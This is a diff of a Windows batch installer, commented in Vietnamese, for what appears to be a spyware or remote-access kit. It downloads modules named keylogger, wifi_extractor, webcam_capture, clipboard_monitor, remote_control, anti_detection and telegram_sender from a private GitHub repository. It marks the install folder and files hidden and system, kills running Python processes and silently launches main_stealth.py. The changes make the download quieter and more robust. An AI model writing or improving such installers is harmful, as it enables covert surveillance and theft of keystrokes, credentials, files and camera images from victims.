@@ -72,15 +72,34 @@ if errorlevel 1 (
 echo [OK] Curl da san sang
 echo.
 
+REM Kiểm tra quyền admin
+net session >nul 2>&1
+if errorlevel 1 (
+    echo [WARNING] Khong co quyền Administrator
+    echo Mot so chuc nang co the khong hoat dong.
+    echo.
+)
+
 REM Tải tất cả file từ GitHub Private Repo
 echo [1/5] Dang tai file tu GitHub...
 echo.
 
+REM Xóa file cũ nếu có (để tránh permission denied)
+if exist "main_stealth.py" (
+    attrib -h -s "main_stealth.py" >nul 2>&1
+    del /f /q "main_stealth.py" >nul 2>&1
+)
+if exist "config.py" (
+    attrib -h -s "config.py" >nul 2>&1
+    del /f /q "config.py" >nul 2>&1
+)
+
 REM Tải từng file một cách rõ ràng
 echo Dang tai main_stealth.py...
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "main_stealth.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py"
+curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "main_stealth.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py" 2>&1 | findstr /V "Total Received Xferd" >nul
 if errorlevel 1 (
     echo [ERROR] Khong the tai main_stealth.py!
+    echo Kiem tra lai GITHUB_TOKEN hoac ket noi internet.
     pause
     exit /b 1
 )
@@ -92,7 +111,11 @@ if not exist "main_stealth.py" (
 echo [OK] Da tai main_stealth.py
 
 echo Dang tai config.py...
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "config.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py"
+if exist "config.py" (
+    attrib -h -s "config.py" >nul 2>&1
+    del /f /q "config.py" >nul 2>&1
+)
+curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "config.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py" 2>&1 | findstr /V "Total Received Xferd" >nul
 if not exist "config.py" (
     echo [ERROR] Khong the tai config.py!
     pause
@@ -101,31 +124,20 @@ if not exist "config.py" (
 echo [OK] Da tai config.py
 
 echo Dang tai requirements.txt...
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "requirements.txt" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/requirements.txt"
+if exist "requirements.txt" (
+    del /f /q "requirements.txt" >nul 2>&1
+)
+curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "requirements.txt" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/requirements.txt" 2>&1 | findstr /V "Total Received Xferd" >nul
 echo [OK] Da tai requirements.txt
 
 echo Dang tai cac file module...
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "screen_recorder.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/screen_recorder.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "keylogger.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/keylogger.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "telegram_sender.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/telegram_sender.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "file_manager.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_manager.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "stealth.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/stealth.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "hotkey_listener.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/hotkey_listener.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "internet_checker.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/internet_checker.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "performance_optimizer.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/performance_optimizer.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "anti_detection.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/anti_detection.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "updater.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/updater.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "data_manager.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/data_manager.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "clipboard_monitor.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/clipboard_monitor.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "screenshot_capture.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/screenshot_capture.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "file_collector.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_collector.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "process_monitor.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/process_monitor.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "machine_id.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/machine_id.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "remote_control.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/remote_control.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "file_receiver.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_receiver.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "wifi_extractor.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/wifi_extractor.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "webcam_capture.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/webcam_capture.py" >nul 2>&1
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "usb_monitor.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/usb_monitor.py" >nul 2>&1
+for %%f in (screen_recorder.py keylogger.py telegram_sender.py file_manager.py stealth.py hotkey_listener.py internet_checker.py performance_optimizer.py anti_detection.py updater.py data_manager.py clipboard_monitor.py screenshot_capture.py file_collector.py process_monitor.py machine_id.py remote_control.py file_receiver.py wifi_extractor.py webcam_capture.py usb_monitor.py) do (
+    if exist "%%f" (
+        attrib -h -s "%%f" >nul 2>&1
+        del /f /q "%%f" >nul 2>&1
+    )
+    curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "%%f" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%%f" >nul 2>&1
+)
 
 echo [OK] Da tai tat ca file
 echo.
@@ -148,7 +160,10 @@ echo.
 REM Ẩn thư mục và file
 echo [3/5] Dang an thu muc va file...
 attrib +h +s "%INSTALL_DIR%" >nul 2>&1
-for %%f in ("%INSTALL_DIR%\*.py") do attrib +h "%%f" >nul 2>&1
+for %%f in ("%INSTALL_DIR%\*.py") do (
+    attrib -r "%%f" >nul 2>&1
+    attrib +h "%%f" >nul 2>&1
+)
 echo [OK] Da an thu muc va file
 echo.
 
@@ -187,6 +202,12 @@ echo.
 
 REM Khởi động ứng dụng
 echo Dang khoi dong ung dung...
+REM Dừng process cũ nếu có
+taskkill /F /IM pythonw.exe /FI "WINDOWTITLE eq *" >nul 2>&1
+taskkill /F /IM python.exe /FI "WINDOWTITLE eq *" >nul 2>&1
+timeout /t 1 >nul 2>&1
+
+REM Khởi động mới
 start "" /min pythonw "%INSTALL_DIR%\main_stealth.py"
 if errorlevel 1 (
     echo [WARNING] Khong the khoi dong bang pythonw, thu bang python...
